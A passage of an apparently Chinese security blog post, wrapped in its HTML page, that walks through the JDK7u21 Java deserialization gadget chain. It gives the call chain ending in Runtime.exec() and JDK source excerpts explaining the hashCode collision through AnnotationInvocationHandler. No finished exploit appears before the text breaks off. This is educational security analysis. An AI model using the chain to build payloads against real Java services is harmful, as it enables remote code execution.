@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="robots" content="noodp" />
+    <title class="pjax-title">Jdk7u21 - Huamang&#39;s Blog</title><meta name="Description" content="Huamang&#39;s Blog"><meta property="og:title" content="Jdk7u21" />
+<meta property="og:description" content="Gadget1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.&lt;clinit&gt;() ... Runtime.exec() 利用链分析这个利用" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://example.com/jdk7u21/" /><meta property="og:image" content="https://example.com/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-10-24T17:46:10+08:00" />
+<meta property="article:modified_time" content="2022-10-24T17:46:10+08:00" /><meta property="og:site_name" content="Huamang&#39;s Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://example.com/logo.png"/>
+
+<meta name="twitter:title" content="Jdk7u21"/>
+<meta name="twitter:description" content="Gadget1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 LinkedHashSet.readObject() LinkedHashSet.add() ... TemplatesImpl.hashCode() (X) LinkedHashSet.add() ... Proxy(Templates).hashCode() (X) AnnotationInvocationHandler.invoke() (X) AnnotationInvocationHandler.hashCodeImpl() (X) String.hashCode() (0) AnnotationInvocationHandler.memberValueHashCode() (X) TemplatesImpl.hashCode() (X) Proxy(Templates).equals() AnnotationInvocationHandler.invoke() AnnotationInvocationHandler.equalsImpl() Method.invoke() ... TemplatesImpl.getOutputProperties() TemplatesImpl.newTransformer() TemplatesImpl.getTransletInstance() TemplatesImpl.defineTransletClasses() ClassLoader.defineClass() Class.newInstance() ... MaliciousClass.&lt;clinit&gt;() ... Runtime.exec() 利用链分析这个利用"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt">
+
+<meta name="theme-color" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" href="https://example.com/jdk7u21/" /><link rel="prev" href="https://example.com/cc7/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css"></noscript><link rel="preload" as="style" onload="this.onload=null;this.rel='stylesheet'" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Jdk7u21",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/example.com\/jdk7u21\/"
+        },"image": ["https:\/\/example.com\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  2809 ,
+        "url": "https:\/\/example.com\/jdk7u21\/","datePublished": "2022-10-24T17:46:10+08:00","dateModified": "2022-10-24T17:46:10+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/example.com\/images\/avatar.png",
+                    "width":  320 ,
+                    "height":  320 
+                }},"author": {
+                "@type": "Person",
+                "name": "Huamang"
+            },"description": ""
+    }
+    </script></head>
+
+<body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">
+        function setTheme(theme) {document.body.setAttribute('theme', theme); document.documentElement.style.setProperty('color-scheme', theme === 'light' ? 'light' : 'dark');}
+        function saveTheme(theme) {window.localStorage && localStorage.setItem('theme', theme);}
+        function getMeta(metaName) {const metas = document.getElementsByTagName('meta'); for (let i = 0; i < metas.length; i++) if (metas[i].getAttribute('name') === metaName) return metas[i]; return '';}
+        if (window.localStorage && localStorage.getItem('theme')) {let theme = localStorage.getItem('theme');theme === 'light' || theme === 'dark' || theme === 'black' ? setTheme(theme) : (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light')); } else { if ('dark' === 'light' || 'dark' === 'dark' || 'dark' === 'black') setTheme('dark'), saveTheme('dark'); else saveTheme('auto'), window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? setTheme('dark') : setTheme('light');}
+        let metaColors = {'light': '#f8f8f8','dark': '#252627','black': '#000000'}
+        getMeta('theme-color').content = metaColors[document.body.getAttribute('theme')];
+    </script>
+    <div id="back-to-top"></div>
+    <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/categories/"> 分类 </a><a class="menu-item" href="/friends/"> 友链 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i>  </a><span class="menu-item delimiter"></span><a href="#" onclick="return false;" class="menu-item language" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" title="Select Language" id="language-select-desktop" onchange="location = this.value;"><option value="/jdk7u21/" selected>简体中文</option></select>
+                    </a><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Huamang&#39;s Blog"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw' aria-hidden='true'></i></span>Huamang&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="#" onclick="return false;" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="#" onclick="return false;" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="#" onclick="return false;" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/categories/" title="">分类</a><a class="menu-item" href="/friends/" title="">友链</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="https://github.com/huamang" title="GitHub" rel="noopener noreferrer" target="_blank"><i class='fab fa-github fa-fw' aria-hidden='true'></i></a><a href="#" onclick="return false;" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="#" onclick="return false;" class="menu-item" title="选择语言">简体中文<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" title="Select Language" onchange="location = this.value;"><option value="/jdk7u21/" selected>简体中文</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+            <div class="container"><div class="toc" id="toc-auto">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content always-active" id="toc-content-auto"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#gadget">Gadget</a></li>
+    <li><a href="#利用链分析">利用链分析</a>
+      <ul>
+        <li><a href="#annotationinvocationhandler">AnnotationInvocationHandler</a></li>
+        <li><a href="#dynamic-proxy">Dynamic Proxy</a></li>
+        <li><a href="#linkedhashset">LinkedHashSet</a></li>
+        <li><a href="#poc">POC</a></li>
+      </ul>
+    </li>
+    <li><a href="#思考">思考</a></li>
+  </ul>
+</nav></div>
+    </div><script>document.getElementsByTagName("main")[0].setAttribute("pageStyle", "normal")</script><script>document.getElementsByTagName("main")[0].setAttribute("autoTOC", "true")</script><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Jdk7u21</h1><div class="post-meta">
+            <div class="post-meta-line">
+                <span class="post-author"><i class="author fas fa-user-circle fa-fw"></i><a href="/" title="Author" rel=" author" class="author">Huamang</a>
+                </span>&nbsp;<span class="post-category">收录于 </span>&nbsp;<span class="post-category">类别 <a href="/categories/java/"><i class="far fa-folder fa-fw"></i>Java</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2022-10-24">2022-10-24</time>&nbsp;<i class="far fa-edit fa-fw"></i>&nbsp;<time datetime="2022-10-24">2022-10-24</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2809 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 6 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#gadget">Gadget</a></li>
+    <li><a href="#利用链分析">利用链分析</a>
+      <ul>
+        <li><a href="#annotationinvocationhandler">AnnotationInvocationHandler</a></li>
+        <li><a href="#dynamic-proxy">Dynamic Proxy</a></li>
+        <li><a href="#linkedhashset">LinkedHashSet</a></li>
+        <li><a href="#poc">POC</a></li>
+      </ul>
+    </li>
+    <li><a href="#思考">思考</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="gadget" class="headerLink">
+    <a href="#gadget" class="header-mark"></a>Gadget</h1><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">LinkedHashSet</span><span class="o">.</span><span class="na">readObject</span><span class="o">()</span>
+  <span class="n">LinkedHashSet</span><span class="o">.</span><span class="na">add</span><span class="o">()</span>
+    <span class="o">...</span>
+      <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">(</span><span class="n">X</span><span class="o">)</span>
+  <span class="n">LinkedHashSet</span><span class="o">.</span><span class="na">add</span><span class="o">()</span>
+    <span class="o">...</span>
+      <span class="n">Proxy</span><span class="o">(</span><span class="n">Templates</span><span class="o">).</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">(</span><span class="n">X</span><span class="o">)</span>
+        <span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span> <span class="o">(</span><span class="n">X</span><span class="o">)</span>
+          <span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">hashCodeImpl</span><span class="o">()</span> <span class="o">(</span><span class="n">X</span><span class="o">)</span>
+            <span class="n">String</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">(</span><span class="n">0</span><span class="o">)</span>
+            <span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">memberValueHashCode</span><span class="o">()</span> <span class="o">(</span><span class="n">X</span><span class="o">)</span>
+              <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">hashCode</span><span class="o">()</span> <span class="o">(</span><span class="n">X</span><span class="o">)</span>
+      <span class="n">Proxy</span><span class="o">(</span><span class="n">Templates</span><span class="o">).</span><span class="na">equals</span><span class="o">()</span>
+        <span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
+          <span class="n">AnnotationInvocationHandler</span><span class="o">.</span><span class="na">equalsImpl</span><span class="o">()</span>
+            <span class="n">Method</span><span class="o">.</span><span class="na">invoke</span><span class="o">()</span>
+              <span class="o">...</span>
+                <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getOutputProperties</span><span class="o">()</span>
+                  <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">newTransformer</span><span class="o">()</span>
+                    <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">getTransletInstance</span><span class="o">()</span>
+                      <span class="n">TemplatesImpl</span><span class="o">.</span><span class="na">defineTransletClasses</span><span class="o">()</span>
+                        <span class="n">ClassLoader</span><span class="o">.</span><span class="na">defineClass</span><span class="o">()</span>
+                        <span class="n">Class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">()</span>
+                          <span class="o">...</span>
+                            <span class="n">MaliciousClass</span><span class="o">.&lt;</span><span class="n">clinit</span><span class="o">&gt;()</span>
+                              <span class="o">...</span>
+                                <span class="n">Runtime</span><span class="o">.</span><span class="na">exec</span><span class="o">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="利用链分析" class="headerLink">
+    <a href="#%e5%88%a9%e7%94%a8%e9%93%be%e5%88%86%e6%9e%90" class="header-mark"></a>利用链分析</h1><p>这个利用链不需要依赖组件，原生的jre环境就可以利用了，看gadget可以发现，这里利用TemplatesImpl来进行恶意字节码的加载，而进入到TemplatesImpl的路径是动态代理</p>
+<h2 id="annotationinvocationhandler" class="headerLink">
+    <a href="#annotationinvocationhandler" class="header-mark"></a>AnnotationInvocationHandler</h2><p>之前我们CC1学习到了动态代理，利用的是一个<code>AnnotationInvocationHandler</code>，他实现了InvocationHandler接口，是可以作为代理的，这里我代理我们的HashMap</p>
+<p>CC1走的是他的invoke里面的get，进而进入到LazyMap的get然后</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221025094901452.png" title="image-20221025094901452" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221025094901452.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221025094901452.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221025094901452.png, https://tuchuang.huamang.xyz/img/image-20221025094901452.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221025094901452.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221025094901452.png">
+    </a></p>
+<p>那么这里我们走的不是这里，而是后面的equalsImpl</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">Object</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">Object</span> <span class="n">var1</span><span class="o">,</span> <span class="n">Method</span> <span class="n">var2</span><span class="o">,</span> <span class="n">Object</span><span class="o">[]</span> <span class="n">var3</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">String</span> <span class="n">var4</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getName</span><span class="o">();</span>
+        <span class="n">Class</span><span class="o">[]</span> <span class="n">var5</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getParameterTypes</span><span class="o">();</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">var4</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">&#34;equals&#34;</span><span class="o">)</span> <span class="o">&amp;&amp;</span> <span class="n">var5</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="n">1</span> <span class="o">&amp;&amp;</span> <span class="n">var5</span><span class="o">[</span><span class="n">0</span><span class="o">]</span> <span class="o">==</span> <span class="n">Object</span><span class="o">.</span><span class="na">class</span><span class="o">)</span> <span class="o">{</span>
+            <span class="k">return</span> <span class="k">this</span><span class="o">.</span><span class="na">equalsImpl</span><span class="o">(</span><span class="n">var3</span><span class="o">[</span><span class="n">0</span><span class="o">]);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="k">assert</span> <span class="n">var5</span><span class="o">.</span><span class="na">length</span> <span class="o">==</span> <span class="n">0</span><span class="o">;</span>
+
+</code></pre></td></tr></table>
+</div>
+</div><p>跟进看，这里会执行到invoke</p>
+<p><a class="lightgallery" href="https://tuchuang.huamang.xyz/img/image-20221025104729837.png" title="image-20221025104729837" data-thumbnail="https://tuchuang.huamang.xyz/img/image-20221025104729837.png">
+        <img
+            class="lazyload"
+            data-src="https://tuchuang.huamang.xyz/img/image-20221025104729837.png"
+            data-srcset="https://tuchuang.huamang.xyz/img/image-20221025104729837.png, https://tuchuang.huamang.xyz/img/image-20221025104729837.png 1.5x, https://tuchuang.huamang.xyz/img/image-20221025104729837.png 2x"
+            data-sizes="auto"
+            alt="https://tuchuang.huamang.xyz/img/image-20221025104729837.png">
+    </a></p>
+<p>看链子是执行到了<code>TemplatesImpl.getOutputProperties()</code>，那么var1就是<code>TemplatesImpl</code>，var5就是<code>getOutputProperties</code></p>
+<h2 id="dynamic-proxy" class="headerLink">
+    <a href="#dynamic-proxy" class="header-mark"></a>Dynamic Proxy</h2><p>那么回到头上，我们要执行到AnnotationInvocationHandler.invoke，这里我们就可以使用动态代理了</p>
+<p>被代理的对象执行方法的时候会转为调用invoke，那么我们衔接这个动态代理的方法就涉及到了<code>LinkedHashSet</code>了</p>
+<h2 id="linkedhashset" class="headerLink">
+    <a href="#linkedhashset" class="header-mark"></a>LinkedHashSet</h2><p>首先从他的readobject进去分析，他自己没有实现readObject，但是他<strong>内部实现基于 HashMap</strong>，在 HashSet 的 <code>writeObject()</code> 方法中，会依次调用每个元素的 <code>writeObject()</code> 方法来实现序列化</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="kt">void</span> <span class="nf">writeObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectOutputStream</span> <span class="n">s</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span> <span class="o">{</span>
+        <span class="o">....</span>
+        <span class="c1">// Write out all elements in the proper order.
+</span><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="n">E</span> <span class="n">e</span> <span class="o">:</span> <span class="n">map</span><span class="o">.</span><span class="na">keySet</span><span class="o">())</span>
+            <span class="n">s</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+    <span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>相应的，在反序列化过程中，会依次调用每个元素的 <code>readObject()</code> 方法，然后将其作为 <code>key</code> (value 为固定值) 依次放入 HashMap 中（这里readObject的时候可能会触发put方法，但是并不影响我们利用链走向）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java">    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span> <span class="o">{</span>
+        <span class="o">...</span>
+        <span class="c1">// Read in all elements in the proper order.
+</span><span class="c1"></span>        <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="n">0</span><span class="o">;</span> <span class="n">i</span><span class="o">&lt;</span><span class="n">size</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
+            <span class="n">E</span> <span class="n">e</span> <span class="o">=</span> <span class="o">(</span><span class="n">E</span><span class="o">)</span> <span class="n">s</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+            <span class="n">map</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">e</span><span class="o">,</span> <span class="n">PRESENT</span><span class="o">);</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看到这里最后走进了一个put方法</p>
+<p>跟进去put方法，这里可以看到就出现了equals了，而且出现了个很熟悉的东西：<code>e.hash == hash</code></p>
+<p>这就和CC7里的那个一样，hashcode碰撞</p>
+<p>这个put方法，首先会调用内部 <code>hash()</code> 函数计算 key 的 hash 值，然后遍历所有元素，**当要插入的元素的 hash 和已有 entry 相同，且 key 和 Entry的 key 指向同一个对象 或 二者equals时 **，则认为 key 是否已经存在，返回 oldValue，否则调用 <code>addEntry()</code> 添加元素</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="n">V</span> <span class="nf">put</span><span class="o">(</span><span class="n">K</span> <span class="n">key</span><span class="o">,</span> <span class="n">V</span> <span class="n">value</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">key</span> <span class="o">==</span> <span class="kc">null</span><span class="o">)</span>
+        <span class="k">return</span> <span class="n">putForNullKey</span><span class="o">(</span><span class="n">value</span><span class="o">);</span>
+    <span class="kt">int</span> <span class="n">hash</span> <span class="o">=</span> <span class="n">hash</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
+    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">indexFor</span><span class="o">(</span><span class="n">hash</span><span class="o">,</span> <span class="n">table</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+    <span class="k">for</span> <span class="o">(</span><span class="n">Entry</span><span class="o">&lt;</span><span class="n">K</span><span class="o">,</span><span class="n">V</span><span class="o">&gt;</span> <span class="n">e</span> <span class="o">=</span> <span class="n">table</span><span class="o">[</span><span class="n">i</span><span class="o">];</span> <span class="n">e</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">;</span> <span class="n">e</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">next</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">Object</span> <span class="n">k</span><span class="o">;</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">e</span><span class="o">.</span><span class="na">hash</span> <span class="o">==</span> <span class="n">hash</span> <span class="o">&amp;&amp;</span> <span class="o">((</span><span class="n">k</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">key</span><span class="o">)</span> <span class="o">==</span> <span class="n">key</span> <span class="o">||</span> <span class="n">key</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="n">k</span><span class="o">)))</span> <span class="o">{</span>
+            <span class="n">V</span> <span class="n">oldValue</span> <span class="o">=</span> <span class="n">e</span><span class="o">.</span><span class="na">value</span><span class="o">;</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">value</span> <span class="o">=</span> <span class="n">value</span><span class="o">;</span>
+            <span class="n">e</span><span class="o">.</span><span class="na">recordAccess</span><span class="o">(</span><span class="k">this</span><span class="o">);</span>
+            <span class="k">return</span> <span class="n">oldValue</span><span class="o">;</span>
+        <span class="o">}</span>
+    <span class="o">}</span>
+
+    <span class="n">modCount</span><span class="o">++;</span>
+    <span class="n">addEntry</span><span class="o">(</span><span class="n">hash</span><span class="o">,</span> <span class="n">key</span><span class="o">,</span> <span class="n">value</span><span class="o">,</span> <span class="n">i</span><span class="o">);</span>
+    <span class="k">return</span> <span class="kc">null</span><span class="o">;</span>
+<span class="o">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以发现，这里会比较<code>LinkedHashSet</code>的两个元素的hash，在这里也就是<code>templatesimpl</code>和<code>proxy</code>，那么如何让他们相等呢</p>
+<blockquote>
+<p>TemplateImpl的 hashCode() 是一个Native方法，每次运 行都会发生变化，我们理论上是无法预测的，所以想让proxy的 hashCode() 与之相等，只能寄希望于 proxy.hashCode() 。</p>
+</blockquote>
+<p>而proxy调用<code>hashCode</code>方法，会跳转到<code>AnnotationInvocationHandler#invoke</code>，进而进入到<code>AnnotationInvocationHandler#hashCodeImpl</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="kt">int</span> <span class="nf">hashCodeImpl</span><span class="o">()</span> <span class="o">{</span>
+  <span class="kt">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">0</span><span class="o">;</span>
+  <span class="k">for</span> <span class="o">(</span><span class="n">Map</span><span class="o">.</span><span class="na">Entry</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">e</span> <span class="o">:</span> <span class="n">memberValues</span><span class="o">.</span><span class="na">entrySet</span><span class="o">())</span> <span class="o">{</span>
